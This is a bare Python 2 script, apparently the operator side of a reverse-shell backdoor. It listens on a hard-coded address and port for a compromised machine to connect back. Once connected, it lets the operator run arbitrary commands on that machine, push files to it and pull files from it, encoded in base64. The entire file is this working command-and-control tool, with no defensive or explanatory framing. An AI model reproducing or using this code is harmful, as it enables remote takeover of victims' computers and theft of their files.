import socket
import json
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))
    
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()
    
    def read_file(self, path):
        try:
            with open(path, 'rb') as my_file:
               return  base64.b64encode(my_file.read())
        except:
            print("[-] The filename seems incorrect!")
            return None
    def write_file(self, path, content):
        with open(path, 'wb') as remote_file:
            remote_file.write(base64.b64decode(content))
            return "[+] Download successful."
    def run(self):
        while True:
            command = raw_input(">>")
            split_command = command.split(' ')
            try:
                if split_command[0] == "upload":
                    command += (' '+self.read_file(split_command[-1]))
                result = self.execute_remotely(command)
                if split_command[0] == "download":
                    result = self.write_file(split_command[-1], result)
                print(result)
            except Exception as e:
                print("[-] Error during command execution.\n"+str(e))
my_listener = Listener("192.168.123.183", 88)
my_listener.run()
